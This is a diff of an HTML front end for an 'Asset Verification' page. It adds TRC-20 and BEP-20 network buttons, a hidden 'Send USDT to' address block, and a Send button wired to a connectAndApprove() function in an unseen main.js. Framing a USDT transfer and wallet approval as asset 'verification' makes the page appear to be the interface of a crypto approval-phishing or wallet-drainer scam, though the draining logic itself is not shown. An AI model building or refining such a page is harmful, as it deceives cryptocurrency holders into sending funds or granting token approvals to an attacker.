@@ -1,18 +1,24 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Verify Asset</title>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Asset Verification</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h1>Verify Asset</h1>
-    <button id="connectButton">Verify Asset</button>
-    <p id="status"></p>
+    <h1>Select Network to Verify Asset</h1>
+    <div class="selector">
+      <button onclick="selectNetwork('trc20')">TRC-20</button>
+      <button onclick="selectNetwork('bep20')">BEP-20</button>
+    </div>
+
+    <div id="details" style="display: none;">
+      <p>Send USDT to:</p>
+      <code id="usdt-address">-</code>
+      <button onclick="connectAndApprove()">Send</button>
+    </div>
   </div>
 
   <script src="main.js"></script>
